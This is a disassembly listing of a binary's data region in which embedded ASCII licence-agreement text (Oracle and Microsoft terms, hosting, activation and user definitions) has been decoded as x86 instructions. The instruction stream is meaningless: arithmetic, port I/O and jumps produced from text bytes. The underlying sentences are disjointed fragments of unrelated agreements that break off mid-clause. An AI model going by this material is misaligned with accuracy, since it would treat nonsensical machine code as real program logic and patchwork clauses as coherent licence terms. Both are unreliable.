  437277:	69 6c 61 62 6c 65 20 	imul   $0x6f20656c,0x62(%ecx,%eiz,2),%ebp
  43727e:	6f 
  43727f:	6e                   	outsb  %ds:(%esi),(%dx)
  437280:	20 68 74             	and    %ch,0x74(%eax)
  437283:	74 70                	je     0x4372f5
  437285:	3a 2f                	cmp    (%edi),%ch
  437287:	2f                   	das
  437288:	77 77                	ja     0x437301
  43728a:	77 2e                	ja     0x4372ba
  43728c:	6f                   	outsl  %ds:(%esi),(%dx)
  43728d:	72 61                	jb     0x4372f0
  43728f:	63 6c 65 2e          	arpl   %ebp,0x2e(%ebp,%eiz,2)
  437293:	63 6f 6d             	arpl   %ebp,0x6d(%edi)
  437296:	2f                   	das
  437297:	65 64 75 63          	gs fs jne 0x4372fe
  43729b:	61                   	popa
  43729c:	74 69                	je     0x437307
  43729e:	6f                   	outsl  %ds:(%esi),(%dx)
  43729f:	6e                   	outsb  %ds:(%esi),(%dx)
  4372a0:	2f                   	das
  4372a1:	6f                   	outsl  %ds:(%esi),(%dx)
  4372a2:	6c                   	insb   (%dx),%es:(%edi)
  4372a3:	6e                   	outsb  %ds:(%esi),(%dx)
  4372a4:	2e 20 4e 6f          	and    %cl,%cs:0x6f(%esi)
  4372a8:	74 77                	je     0x437321
  4372aa:	69 74 68 73 74 61 6e 	imul   $0x646e6174,0x73(%eax,%ebp,2),%esi
  4372b1:	64 
  4372b2:	69 6e 67 20 61 6e 79 	imul   $0x796e6120,0x67(%esi),%ebp
  4372b9:	74 68                	je     0x437323
  4372bb:	69 6e 67 20 74 6f 20 	imul   $0x206f7420,0x67(%esi),%ebp
  4372c2:	74 68                	je     0x43732c
  4372c4:	65 20 63 6f          	and    %ah,%gs:0x6f(%ebx)
  4372c8:	6e                   	outsb  %ds:(%esi),(%dx)
  4372c9:	74 72                	je     0x43733d
  4372cb:	61                   	popa
  4372cc:	72 79                	jb     0x437347
  4372ce:	20 69 6e             	and    %ch,0x6e(%ecx)
  4372d1:	20 74 68 65          	and    %dh,0x65(%eax,%ebp,2)
  4372d5:	20 61 67             	and    %ah,0x67(%ecx)
  4372d8:	72 65                	jb     0x43733f
  4372da:	65 6d                	gs insl (%dx),%es:(%edi)
  4372dc:	65 6e                	outsb  %gs:(%esi),(%dx)
  4372de:	74 2c                	je     0x43730c
  4372e0:	0a 73 70             	or     0x70(%ebx),%dh
  4372e3:	65 63 69 66          	arpl   %ebp,%gs:0x66(%ecx)
  4372e7:	79 69                	jns    0x437352
  4372e9:	6e                   	outsb  %ds:(%esi),(%dx)
  4372ea:	67 20 61 20          	and    %ah,0x20(%bx,%di)
  4372ee:	31 20                	xor    %esp,(%eax)
  4372f0:	59                   	pop    %ecx
  4372f1:	65 61                	gs popa
  4372f3:	72 20                	jb     0x437315
  4372f5:	48                   	dec    %eax
  4372f6:	6f                   	outsl  %ds:(%esi),(%dx)
  4372f7:	73 74                	jae    0x43736d
  4372f9:	69 6e 67 20 54 65 72 	imul   $0x72655420,0x67(%esi),%ebp
  437300:	6d                   	insl   (%dx),%es:(%edi)
  437301:	20 6d 61             	and    %ch,0x61(%ebp)
  437304:	79 20                	jns    0x437326
  437306:	6f                   	outsl  %ds:(%esi),(%dx)
  437307:	6e                   	outsb  %ds:(%esi),(%dx)
  437308:	6c                   	insb   (%dx),%es:(%edi)
  437309:	79 20                	jns    0x43732b
  43730b:	62 65 20             	bound  %esp,0x20(%ebp)
  43730e:	75 73                	jne    0x437383
  437310:	65 64 20 66 6f       	gs and %ah,%fs:0x6f(%esi)
  437315:	72 20                	jb     0x437337
  437317:	70 72                	jo     0x43738b
  437319:	6f                   	outsl  %ds:(%esi),(%dx)
  43731a:	76 69                	jbe    0x437385
  43731c:	64 69 6e 67 20 69 6e 	imul   $0x746e6920,%fs:0x67(%esi),%ebp
  437323:	74 
  437324:	65 72 6e             	gs jb  0x437395
  437327:	65 74 20             	gs je  0x43734a
  43732a:	68 6f 73 74 69       	push   $0x6974736f
  43732f:	6e                   	outsb  %ds:(%esi),(%dx)
  437330:	67 20 73 65          	and    %dh,0x65(%bp,%di)
  437334:	72 76                	jb     0x4373ac
  437336:	69 63 65 73 2e 0a 74 	imul   $0x740a2e73,0x65(%ebx),%esp
  43733d:	68 65 20 6f 72       	push   $0x726f2065
  437342:	69 67 69 6e 61 6c 20 	imul   $0x206c616e,0x69(%edi),%esp
  437349:	73 6f                	jae    0x4373ba
  43734b:	66 74 77             	data16 je 0x4373c5
  43734e:	61                   	popa
  43734f:	72 65                	jb     0x4373b6
  437351:	20 61 66             	and    %ah,0x66(%ecx)
  437354:	74 65                	je     0x4373bb
  437356:	72 20                	jb     0x437378
  437358:	79 6f                	jns    0x4373c9
  43735a:	75 20                	jne    0x43737c
  43735c:	68 61 76 65 20       	push   $0x20657661
  437361:	75 70                	jne    0x4373d3
  437363:	67 72 61             	addr16 jb 0x4373c7
  437366:	64 65 64 20 61 6e    	fs gs and %ah,%fs:0x6e(%ecx)
  43736c:	64 20 79 6f          	and    %bh,%fs:0x6f(%ecx)
  437370:	75 20                	jne    0x437392
  437372:	6d                   	insl   (%dx),%es:(%edi)
  437373:	61                   	popa
  437374:	79 20                	jns    0x437396
  437376:	6e                   	outsb  %ds:(%esi),(%dx)
  437377:	6f                   	outsl  %ds:(%esi),(%dx)
  437378:	74 20                	je     0x43739a
  43737a:	63 6f 6e             	arpl   %ebp,0x6e(%edi)
  43737d:	74 69                	je     0x4373e8
  43737f:	6e                   	outsb  %ds:(%esi),(%dx)
  437380:	75 65                	jne    0x4373e7
  437382:	20 74 6f 20          	and    %dh,0x20(%edi,%ebp,2)
  437386:	75 73                	jne    0x4373fb
  437388:	65 20 69 74          	and    %ch,%gs:0x74(%ecx)
  43738c:	20 6f 72             	and    %ch,0x72(%edi)
  43738f:	20 74 72 61          	and    %dh,0x61(%edx,%esi,2)
  437393:	6e                   	outsb  %ds:(%esi),(%dx)
  437394:	73 66                	jae    0x4373fc
  437396:	65 72 20             	gs jb  0x4373b9
  437399:	69 74 20 69 6e 20 61 	imul   $0x6e61206e,0x69(%eax,%eiz,1),%esi
  4373a0:	6e 
  4373a1:	79 0a                	jns    0x4373ad
  4373a3:	53                   	push   %ebx
  4373a4:	70 65                	jo     0x43740b
  4373a6:	63 69 61             	arpl   %ebp,0x61(%ecx)
  4373a9:	6c                   	insb   (%dx),%es:(%edi)
  4373aa:	20 45 64             	and    %al,0x64(%ebp)
  4373ad:	69 74 69 6f 6e 73 20 	imul   $0x6f20736e,0x6f(%ecx,%ebp,2),%esi
  4373b4:	6f 
  4373b5:	66 20 74 68 65       	data16 and %dh,0x65(%eax,%ebp,2)
  4373ba:	20 73 6f             	and    %dh,0x6f(%ebx)
  4373bd:	66 74 77             	data16 je 0x437437
  4373c0:	61                   	popa
  4373c1:	72 65                	jb     0x437428
  4373c3:	2e 20 54 68 65       	and    %dl,%cs:0x65(%eax,%ebp,2)
  4373c8:	20 63 6f             	and    %ah,0x6f(%ebx)
  4373cb:	6d                   	insl   (%dx),%es:(%edi)
  4373cc:	70 6f                	jo     0x43743d
  4373ce:	6e                   	outsb  %ds:(%esi),(%dx)
  4373cf:	65 6e                	outsb  %gs:(%esi),(%dx)
  4373d1:	74 73                	je     0x437446
  4373d3:	20 6f 66             	and    %ch,0x66(%edi)
  4373d6:	20 74 68 65          	and    %dh,0x65(%eax,%ebp,2)
  4373da:	20 73 6f             	and    %dh,0x6f(%ebx)
  4373dd:	66 74 77             	data16 je 0x437457
  4373e0:	61                   	popa
  4373e1:	72 65                	jb     0x437448
  4373e3:	20 61 72             	and    %ah,0x72(%ecx)
  4373e6:	65 20 6c 69 63       	and    %ch,%gs:0x63(%ecx,%ebp,2)
  4373eb:	65 6e                	outsb  %gs:(%esi),(%dx)
  4373ed:	73 65                	jae    0x437454
  4373ef:	64 20 61 73          	and    %ah,%fs:0x73(%ecx)
  4373f3:	20 61 20             	and    %ah,0x20(%ecx)
  4373f6:	73 69                	jae    0x437461
  4373f8:	6e                   	outsb  %ds:(%esi),(%dx)
  4373f9:	67 6c                	insb   (%dx),%es:(%di)
  4373fb:	65 20 75 6e          	and    %dh,%gs:0x6e(%ebp)
  4373ff:	69 74 2e 20 59 6f 75 	imul   $0x20756f59,0x20(%esi,%ebp,1),%esi
  437406:	20 
  437407:	6d                   	insl   (%dx),%es:(%edi)
  437408:	61                   	popa
  437409:	79 0a                	jns    0x437415
  43740b:	50                   	push   %eax
  43740c:	72 6f                	jb     0x43747d
  43740e:	66 65 73 73          	data16 gs jae 0x437485
  437412:	69 6f 6e 61 6c 20 55 	imul   $0x55206c61,0x6e(%edi),%ebp
  437419:	73 65                	jae    0x437480
  43741b:	72 20                	jb     0x43743d
  43741d:	e2 80                	loop   0x43739f
  43741f:	93                   	xchg   %eax,%ebx
  437420:	20 45 78             	and    %al,0x78(%ebp)
  437423:	74 65                	je     0x43748a
  437425:	72 6e                	jb     0x437495
  437427:	61                   	popa
  437428:	6c                   	insb   (%dx),%es:(%edi)
  437429:	20 3a                	and    %bh,(%edx)
  43742b:	20 69 73             	and    %ch,0x73(%ecx)
  43742e:	20 64 65 66          	and    %ah,0x66(%ebp,%eiz,2)
  437432:	69 6e 65 64 20 61 73 	imul   $0x73612064,0x65(%esi),%ebp
  437439:	20 61 6e             	and    %ah,0x6e(%ecx)
  43743c:	20 69 6e             	and    %ch,0x6e(%ecx)
  43743f:	64 69 76 69 64 75 61 	imul   $0x6c617564,%fs:0x69(%esi),%esi
  437446:	6c 
  437447:	2c 20                	sub    $0x20,%al
  437449:	77 68                	ja     0x4374b3
  43744b:	6f                   	outsl  %ds:(%esi),(%dx)
  43744c:	20 69 73             	and    %ch,0x73(%ecx)
  43744f:	20 6e 6f             	and    %ch,0x6f(%esi)
  437452:	74 20                	je     0x437474
  437454:	79 6f                	jns    0x4374c5
  437456:	75 72                	jne    0x4374ca
  437458:	20 65 6d             	and    %ah,0x6d(%ebp)
  43745b:	70 6c                	jo     0x4374c9
  43745d:	6f                   	outsl  %ds:(%esi),(%dx)
  43745e:	79 65                	jns    0x4374c5
  437460:	65 2c 20             	gs sub $0x20,%al
  437463:	63 6f 6e             	arpl   %ebp,0x6e(%edi)
  437466:	74 72                	je     0x4374da
  437468:	61                   	popa
  437469:	63 74 6f 72          	arpl   %esi,0x72(%edi,%ebp,2)
  43746d:	20 6f 72             	and    %ch,0x72(%edi)
  437470:	20 6f 75             	and    %ch,0x75(%edi)
  437473:	74 73                	je     0x4374e8
  437475:	6f                   	outsl  %ds:(%esi),(%dx)
  437476:	75 72                	jne    0x4374ea
  437478:	63 65 72             	arpl   %esp,0x72(%ebp)
  43747b:	2c 20                	sub    $0x20,%al
  43747d:	61                   	popa
  43747e:	75 74                	jne    0x4374f4
  437480:	68 6f 72 69 7a       	push   $0x7a69726f
  437485:	65 64 20 62 79       	gs and %ah,%fs:0x79(%edx)
  43748a:	0a 61 6e             	or     0x6e(%ecx),%ah
  43748d:	6e                   	outsb  %ds:(%esi),(%dx)
  43748e:	75 61                	jne    0x4374f1
  437490:	6c                   	insb   (%dx),%es:(%edi)
  437491:	20 72 65             	and    %dh,0x65(%edx)
  437494:	70 6f                	jo     0x437505
  437496:	72 74                	jb     0x43750c
  437498:	20 6f 72             	and    %ch,0x72(%edi)
  43749b:	20 74 68 65          	and    %dh,0x65(%eax,%ebp,2)
  43749f:	20 65 71             	and    %ah,0x71(%ebp)
  4374a2:	75 69                	jne    0x43750d
  4374a4:	76 61                	jbe    0x437507
  4374a6:	6c                   	insb   (%dx),%es:(%edi)
  4374a7:	65 6e                	outsb  %gs:(%esi),(%dx)
  4374a9:	74 20                	je     0x4374cb
  4374ab:	61                   	popa
  4374ac:	63 63 6f             	arpl   %esp,0x6f(%ebx)
  4374af:	75 6e                	jne    0x43751f
  4374b1:	74 69                	je     0x43751c
  4374b3:	6e                   	outsb  %ds:(%esi),(%dx)
  4374b4:	67 20 6f 72          	and    %ch,0x72(%bx)
  4374b8:	20 72 65             	and    %dh,0x65(%edx)
  4374bb:	70 6f                	jo     0x43752c
  4374bd:	72 74                	jb     0x437533
  4374bf:	69 6e 67 20 64 6f 63 	imul   $0x636f6420,0x67(%esi),%ebp
  4374c6:	75 6d                	jne    0x437535
  4374c8:	65 6e                	outsb  %gs:(%esi),(%dx)
  4374ca:	74 2e                	je     0x4374fa
  4374cc:	0a 50 52             	or     0x52(%eax),%dl
  4374cf:	4f                   	dec    %edi
  4374d0:	43                   	inc    %ebx
  4374d1:	45                   	inc    %ebp
  4374d2:	45                   	inc    %ebp
  4374d3:	44                   	inc    %esp
  4374d4:	49                   	dec    %ecx
  4374d5:	4e                   	dec    %esi
  4374d6:	47                   	inc    %edi
  4374d7:	20 57 49             	and    %dl,0x49(%edi)
  4374da:	4c                   	dec    %esp
  4374db:	4c                   	dec    %esp
  4374dc:	20 42 45             	and    %al,0x45(%edx)
  4374df:	20 43 4f             	and    %al,0x4f(%ebx)
  4374e2:	4d                   	dec    %ebp
  4374e3:	42                   	inc    %edx
  4374e4:	49                   	dec    %ecx
  4374e5:	4e                   	dec    %esi
  4374e6:	45                   	inc    %ebp
  4374e7:	44                   	inc    %esp
  4374e8:	20 57 49             	and    %dl,0x49(%edi)
  4374eb:	54                   	push   %esp
  4374ec:	48                   	dec    %eax
  4374ed:	20 41 20             	and    %al,0x20(%ecx)
  4374f0:	4e                   	dec    %esi
  4374f1:	4f                   	dec    %edi
  4374f2:	54                   	push   %esp
  4374f3:	48                   	dec    %eax
  4374f4:	45                   	inc    %ebp
  4374f5:	52                   	push   %edx
  4374f6:	20 57 49             	and    %dl,0x49(%edi)
  4374f9:	54                   	push   %esp
  4374fa:	48                   	dec    %eax
  4374fb:	4f                   	dec    %edi
  4374fc:	55                   	push   %ebp
  4374fd:	54                   	push   %esp
  4374fe:	20 54 48 45          	and    %dl,0x45(%eax,%ecx,2)
  437502:	20 50 52             	and    %dl,0x52(%eax)
  437505:	49                   	dec    %ecx
  437506:	4f                   	dec    %edi
  437507:	52                   	push   %edx
  437508:	20 57 52             	and    %dl,0x52(%edi)
  43750b:	49                   	dec    %ecx
  43750c:	54                   	push   %esp
  43750d:	54                   	push   %esp
  43750e:	45                   	inc    %ebp
  43750f:	4e                   	dec    %esi
  437510:	0a 66 69             	or     0x69(%esi),%ah
  437513:	6c                   	insb   (%dx),%es:(%edi)
  437514:	65 73 20             	gs jae 0x437537
  437517:	61                   	popa
  437518:	6e                   	outsb  %ds:(%esi),(%dx)
  437519:	64 20 6d 61          	and    %ch,%fs:0x61(%ebp)
  43751d:	63 72 6f             	arpl   %esi,0x6f(%edx)
  437520:	73 20                	jae    0x437542
  437522:	74 6f                	je     0x437593
  437524:	20 76 65             	and    %dh,0x65(%esi)
  437527:	72 69                	jb     0x437592
  437529:	66 79 20             	data16 jns 0x43754c
  43752c:	74 68                	je     0x437596
  43752e:	65 20 69 6e          	and    %ch,%gs:0x6e(%ecx)
  437532:	74 65                	je     0x437599
  437534:	67 72 69             	addr16 jb 0x4375a0
  437537:	74 79                	je     0x4375b2
  437539:	20 61 6e             	and    %ah,0x6e(%ecx)
  43753c:	64 20 6f 72          	and    %ch,%fs:0x72(%edi)
  437540:	69 67 69 6e 20 6f 66 	imul   $0x666f206e,0x69(%edi),%esp
  437547:	20 74 68 65          	and    %dh,0x65(%eax,%ebp,2)
  43754b:	20 66 69             	and    %ah,0x69(%esi)
  43754e:	6c                   	insb   (%dx),%es:(%edi)
  43754f:	65 20 63 6f          	and    %ah,%gs:0x6f(%ebx)
  437553:	6e                   	outsb  %ds:(%esi),(%dx)
  437554:	74 65                	je     0x4375bb
  437556:	6e                   	outsb  %ds:(%esi),(%dx)
  437557:	74 73                	je     0x4375cc
  437559:	2e 20 54 68 65       	and    %dl,%cs:0x65(%eax,%ebp,2)
  43755e:	20 73 6f             	and    %dh,0x6f(%ebx)
  437561:	66 74 77             	data16 je 0x4375db
  437564:	61                   	popa
  437565:	72 65                	jb     0x4375cc
  437567:	20 72 65             	and    %dh,0x65(%edx)
  43756a:	74 72                	je     0x4375de
  43756c:	69 65 76 65 73 20 63 	imul   $0x63207365,0x76(%ebp),%esp
  437573:	65 72 74             	gs jb  0x4375ea
  437576:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  43757d:	73 0a                	jae    0x437589
  43757f:	64 69 73 74 72 69 62 	imul   $0x75626972,%fs:0x74(%ebx),%esi
  437586:	75 
  437587:	74 65                	je     0x4375ee
  437589:	20 63 6f             	and    %ah,0x6f(%ebx)
  43758c:	70 69                	jo     0x4375f7
  43758e:	65 73 20             	gs jae 0x4375b1
  437591:	6f                   	outsl  %ds:(%esi),(%dx)
  437592:	66 20 61 6e          	data16 and %ah,0x6e(%ecx)
  437596:	79 20                	jns    0x4375b8
  437598:	6d                   	insl   (%dx),%es:(%edi)
  437599:	65 64 69 61 20 65 6c 	gs imul $0x6d656c65,%fs:0x20(%ecx),%esp
  4375a0:	65 6d 
  4375a2:	65 6e                	outsb  %gs:(%esi),(%dx)
  4375a4:	74 73                	je     0x437619
  4375a6:	20 62 79             	and    %ah,0x79(%edx)
  4375a9:	20 74 68 65          	and    %dh,0x65(%eax,%ebp,2)
  4375ad:	6d                   	insl   (%dx),%es:(%edi)
  4375ae:	73 65                	jae    0x437615
  4375b0:	6c                   	insb   (%dx),%es:(%edi)
  4375b1:	76 65                	jbe    0x437618
  4375b3:	73 20                	jae    0x4375d5
  4375b5:	6f                   	outsl  %ds:(%esi),(%dx)
  4375b6:	72 20                	jb     0x4375d8
  4375b8:	61                   	popa
  4375b9:	73 20                	jae    0x4375db
  4375bb:	61                   	popa
  4375bc:	20 70 72             	and    %dh,0x72(%eax)
  4375bf:	6f                   	outsl  %ds:(%esi),(%dx)
  4375c0:	64 75 63             	fs jne 0x437626
  4375c3:	74 20                	je     0x4375e5
  4375c5:	69 66 20 74 68 65 20 	imul   $0x20656874,0x20(%esi),%esp
  4375cc:	70 72                	jo     0x437640
  4375ce:	69 6d 61 72 79 20 76 	imul   $0x76207972,0x61(%ebp),%ebp
  4375d5:	61                   	popa
  4375d6:	6c                   	insb   (%dx),%es:(%edi)
  4375d7:	75 65                	jne    0x43763e
  4375d9:	20 6f 66             	and    %ch,0x66(%edi)
  4375dc:	20 74 68 65          	and    %dh,0x65(%eax,%ebp,2)
  4375e0:	20 70 72             	and    %dh,0x72(%eax)
  4375e3:	6f                   	outsl  %ds:(%esi),(%dx)
  4375e4:	64 75 63             	fs jne 0x43764a
  4375e7:	74 0a                	je     0x4375f3
  4375e9:	6c                   	insb   (%dx),%es:(%edi)
  4375ea:	69 63 65 6e 73 65 64 	imul   $0x6465736e,0x65(%ebx),%esp
  4375f1:	20 70 72             	and    %dh,0x72(%eax)
  4375f4:	6f                   	outsl  %ds:(%esi),(%dx)
  4375f5:	67 72 61             	addr16 jb 0x437659
  4375f8:	6d                   	insl   (%dx),%es:(%edi)
  4375f9:	20 6f 6e             	and    %ch,0x6e(%edi)
  4375fc:	20 61 20             	and    %ah,0x20(%ecx)
  4375ff:	73 69                	jae    0x43766a
  437601:	6e                   	outsb  %ds:(%esi),(%dx)
  437602:	67 6c                	insb   (%dx),%es:(%di)
  437604:	65 20 73 70          	and    %dh,%gs:0x70(%ebx)
  437608:	65 63 69 66          	arpl   %ebp,%gs:0x66(%ecx)
  43760c:	69 65 64 20 63 6f 6d 	imul   $0x6d6f6320,0x64(%ebp),%esp
  437613:	70 75                	jo     0x43768a
  437615:	74 65                	je     0x43767c
  437617:	72 2e                	jb     0x437647
  437619:	0a 68 75             	or     0x75(%eax),%ch
  43761c:	6e                   	outsb  %ds:(%esi),(%dx)
  43761d:	64 72 65             	fs jb  0x437685
  437620:	64 20 65 75          	and    %ah,%fs:0x75(%ebp)
  437624:	72 6f                	jb     0x437695
  437626:	73 29                	jae    0x437651
  437628:	20 69 6e             	and    %ch,0x6e(%ecx)
  43762b:	20 61 6c             	and    %ah,0x6c(%ecx)
  43762e:	6c                   	insb   (%dx),%es:(%edi)
  43762f:	20 70 75             	and    %dh,0x75(%eax)
  437632:	72 63                	jb     0x437697
  437634:	68 61 73 65 20       	push   $0x20657361
  437639:	6f                   	outsl  %ds:(%esi),(%dx)
  43763a:	72 64                	jb     0x4376a0
  43763c:	65 72 73             	gs jb  0x4376b2
  43763f:	20 74 72 61          	and    %dh,0x61(%edx,%esi,2)
  437643:	6e                   	outsb  %ds:(%esi),(%dx)
  437644:	73 61                	jae    0x4376a7
  437646:	63 74 65 64          	arpl   %esi,0x64(%ebp,%eiz,2)
  43764a:	20 61 6e             	and    %ah,0x6e(%ecx)
  43764d:	64 20 61 6c          	and    %ah,%fs:0x6c(%ecx)
  437651:	6c                   	insb   (%dx),%es:(%edi)
  437652:	20 61 75             	and    %ah,0x75(%ecx)
  437655:	63 74 69 6f          	arpl   %esi,0x6f(%ecx,%ebp,2)
  437659:	6e                   	outsb  %ds:(%esi),(%dx)
  43765a:	73 20                	jae    0x43767c
  43765c:	63 6f 6e             	arpl   %ebp,0x6e(%edi)
  43765f:	64 75 63             	fs jne 0x4376c5
  437662:	74 65                	je     0x4376c9
  437664:	64 20 74 68 72       	and    %dh,%fs:0x72(%eax,%ebp,2)
  437669:	6f                   	outsl  %ds:(%esi),(%dx)
  43766a:	75 67                	jne    0x4376d3
  43766c:	68 20 74 68 65       	push   $0x65687420
  437671:	20 4f 72             	and    %cl,0x72(%edi)
  437674:	61                   	popa
  437675:	63 6c 65 20          	arpl   %ebp,0x20(%ebp,%eiz,2)
  437679:	45                   	inc    %ebp
  43767a:	78 63                	js     0x4376df
  43767c:	68 61 6e 67 65       	push   $0x65676e61
  437681:	20 4d 61             	and    %cl,0x61(%ebp)
  437684:	72 6b                	jb     0x4376f1
  437686:	65 74 70             	gs je  0x4376f9
  437689:	6c                   	insb   (%dx),%es:(%edi)
  43768a:	61                   	popa
  43768b:	63 65 20             	arpl   %esp,0x20(%ebp)
  43768e:	62 79 20             	bound  %edi,0x20(%ecx)
  437691:	79 6f                	jns    0x437702
  437693:	75 0a                	jne    0x43769f
  437695:	4d                   	dec    %ebp
  437696:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  43769d:	74 20                	je     0x4376bf
  43769f:	74 6f                	je     0x437710
  4376a1:	20 75 73             	and    %dh,0x73(%ebp)
  4376a4:	65 20 74 68 69       	and    %dh,%gs:0x69(%eax,%ebp,2)
  4376a9:	73 20                	jae    0x4376cb
  4376ab:	66 65 61             	gs popaw
  4376ae:	74 75                	je     0x437725
  4376b0:	72 65                	jb     0x437717
  4376b2:	20 66 6f             	and    %ah,0x6f(%esi)
  4376b5:	72 20                	jb     0x4376d7
  4376b7:	74 68                	je     0x437721
  4376b9:	65 20 66 69          	and    %ah,%gs:0x69(%esi)
  4376bd:	72 73                	jb     0x437732
  4376bf:	74 20                	je     0x4376e1
  4376c1:	74 69                	je     0x43772c
  4376c3:	6d                   	insl   (%dx),%es:(%edi)
  4376c4:	65 2c 20             	gs sub $0x20,%al
  4376c7:	61                   	popa
  4376c8:	6e                   	outsb  %ds:(%esi),(%dx)
  4376c9:	64 20 79 6f          	and    %bh,%fs:0x6f(%ecx)
  4376cd:	75 20                	jne    0x4376ef
  4376cf:	6d                   	insl   (%dx),%es:(%edi)
  4376d0:	61                   	popa
  4376d1:	79 20                	jns    0x4376f3
  4376d3:	6e                   	outsb  %ds:(%esi),(%dx)
  4376d4:	65 65 64 20 74 6f 20 	gs gs and %dh,%fs:0x20(%edi,%ebp,2)
  4376db:	72 65                	jb     0x437742
  4376dd:	63 6f 6e             	arpl   %ebp,0x6e(%edi)
  4376e0:	6e                   	outsb  %ds:(%esi),(%dx)
  4376e1:	65 63 74 20 74       	arpl   %esi,%gs:0x74(%eax,%eiz,1)
  4376e6:	6f                   	outsl  %ds:(%esi),(%dx)
  4376e7:	20 4d 69             	and    %cl,0x69(%ebp)
  4376ea:	63 72 6f             	arpl   %esi,0x6f(%edx)
  4376ed:	73 6f                	jae    0x43775e
  4376ef:	66 74 20             	data16 je 0x437712
  4376f2:	70 65                	jo     0x437759
  4376f4:	72 69                	jb     0x43775f
  4376f6:	6f                   	outsl  %ds:(%esi),(%dx)
  4376f7:	64 69 63 61 6c 6c 79 	imul   $0x20796c6c,%fs:0x61(%ebx),%esp
  4376fe:	20 
  4376ff:	74 6f                	je     0x437770
  437701:	0a 62 65             	or     0x65(%edx),%ah
  437704:	74 77                	je     0x43777d
  437706:	65 65 6e             	gs outsb %gs:(%esi),(%dx)
  437709:	20 79 6f             	and    %bh,0x6f(%ecx)
  43770c:	75 20                	jne    0x43772e
  43770e:	61                   	popa
  43770f:	6e                   	outsb  %ds:(%esi),(%dx)
  437710:	64 20 74 68 65       	and    %dh,%fs:0x65(%eax,%ebp,2)
  437715:	20 63 6f             	and    %ah,0x6f(%ebx)
  437718:	6d                   	insl   (%dx),%es:(%edi)
  437719:	70 75                	jo     0x437790
  43771b:	74 65                	je     0x437782
  43771d:	72 20                	jb     0x43773f
  43771f:	6d                   	insl   (%dx),%es:(%edi)
  437720:	61                   	popa
  437721:	6e                   	outsb  %ds:(%esi),(%dx)
  437722:	75 66                	jne    0x43778a
  437724:	61                   	popa
  437725:	63 74 75 72          	arpl   %esi,0x72(%ebp,%esi,2)
  437729:	65 72 20             	gs jb  0x43774c
  43772c:	6f                   	outsl  %ds:(%esi),(%dx)
  43772d:	72 20                	jb     0x43774f
  43772f:	73 6f                	jae    0x4377a0
  437731:	66 74 77             	data16 je 0x4377ab
  437734:	61                   	popa
  437735:	72 65                	jb     0x43779c
  437737:	20 69 6e             	and    %ch,0x6e(%ecx)
  43773a:	73 74                	jae    0x4377b0
  43773c:	61                   	popa
  43773d:	6c                   	insb   (%dx),%es:(%edi)
  43773e:	6c                   	insb   (%dx),%es:(%edi)
  43773f:	65 72 20             	gs jb  0x437762
  437742:	74 68                	je     0x4377ac
  437744:	61                   	popa
  437745:	74 20                	je     0x437767
  437747:	64 69 73 74 72 69 62 	imul   $0x75626972,%fs:0x74(%ebx),%esi
  43774e:	75 
  43774f:	74 65                	je     0x4377b6
  437751:	73 20                	jae    0x437773
  437753:	74 68                	je     0x4377bd
  437755:	65 20 4d 69          	and    %cl,%gs:0x69(%ebp)
  437759:	63 72 6f             	arpl   %esi,0x6f(%edx)
  43775c:	73 6f                	jae    0x4377cd
  43775e:	66 74 20             	data16 je 0x437781
  437761:	4f                   	dec    %edi
  437762:	66 66 69 63 65 0a 46 	data16 imul $0x460a,0x65(%ebx),%sp
  437769:	69 65 6c 64 20 54 65 	imul   $0x65542064,0x6c(%ebp),%esp
  437770:	63 68 6e             	arpl   %ebp,0x6e(%eax)
  437773:	69 63 69 61 6e 3a 20 	imul   $0x203a6e61,0x69(%ebx),%esp
  43777a:	69 73 20 64 65 66 69 	imul   $0x69666564,0x20(%ebx),%esi
  437781:	6e                   	outsb  %ds:(%esi),(%dx)
  437782:	65 64 20 61 73       	gs and %ah,%fs:0x73(%ecx)
  437787:	20 61 6e             	and    %ah,0x6e(%ecx)
  43778a:	20 65 6e             	and    %ah,0x6e(%ebp)
  43778d:	67 69 6e 65 65 72 2c 	imul   $0x202c7265,0x65(%bp),%ebp
  437794:	20 
  437795:	74 65                	je     0x4377fc
  437797:	63 68 6e             	arpl   %ebp,0x6e(%eax)
  43779a:	69 63 69 61 6e 2c 20 	imul   $0x202c6e61,0x69(%ebx),%esp
  4377a1:	72 65                	jb     0x437808
  4377a3:	70 72                	jo     0x437817
  4377a5:	65 73 65             	gs jae 0x43780d
  4377a8:	6e                   	outsb  %ds:(%esi),(%dx)
  4377a9:	74 61                	je     0x43780c
  4377ab:	74 69                	je     0x437816
  4377ad:	76 65                	jbe    0x437814
  4377af:	2c 20                	sub    $0x20,%al
  4377b1:	6f                   	outsl  %ds:(%esi),(%dx)
  4377b2:	72 20                	jb     0x4377d4
  4377b4:	6f                   	outsl  %ds:(%esi),(%dx)
  4377b5:	74 68                	je     0x43781f
  4377b7:	65 72 20             	gs jb  0x4377da
  4377ba:	70 65                	jo     0x437821
  4377bc:	72 73                	jb     0x437831
  4377be:	6f                   	outsl  %ds:(%esi),(%dx)
  4377bf:	6e                   	outsb  %ds:(%esi),(%dx)
  4377c0:	20 77 68             	and    %dh,0x68(%edi)
  4377c3:	6f                   	outsl  %ds:(%esi),(%dx)
  4377c4:	20 69 73             	and    %ch,0x73(%ecx)
  4377c7:	20 64 69 73          	and    %ah,0x73(%ecx,%ebp,2)
  4377cb:	70 61                	jo     0x43782e
  4377cd:	74 63                	je     0x437832
  4377cf:	68 65 64 20 62       	push   $0x62206465
  4377d4:	79 20                	jns    0x4377f6
  4377d6:	79 6f                	jns    0x437847
  4377d8:	75 2c                	jne    0x437806
  4377da:	20 69 6e             	and    %ch,0x6e(%ecx)
  4377dd:	63 6c 75 64          	arpl   %ebp,0x64(%ebp,%esi,2)
  4377e1:	69 6e 67 0a 54 6f 20 	imul   $0x206f540a,0x67(%esi),%ebp
  4377e8:	69 64 65 6e 74 69 66 	imul   $0x79666974,0x6e(%ebp,%eiz,2),%esp
  4377ef:	79 
  4377f0:	20 67 65             	and    %ah,0x65(%edi)
  4377f3:	6e                   	outsb  %ds:(%esi),(%dx)
  4377f4:	75 69                	jne    0x43785f
  4377f6:	6e                   	outsb  %ds:(%esi),(%dx)
  4377f7:	65 20 4d 69          	and    %cl,%gs:0x69(%ebp)
  4377fb:	63 72 6f             	arpl   %esi,0x6f(%edx)
  4377fe:	73 6f                	jae    0x43786f
  437800:	66 74 20             	data16 je 0x437823
  437803:	73 6f                	jae    0x437874
  437805:	66 74 77             	data16 je 0x43787f
  437808:	61                   	popa
  437809:	72 65                	jb     0x437870
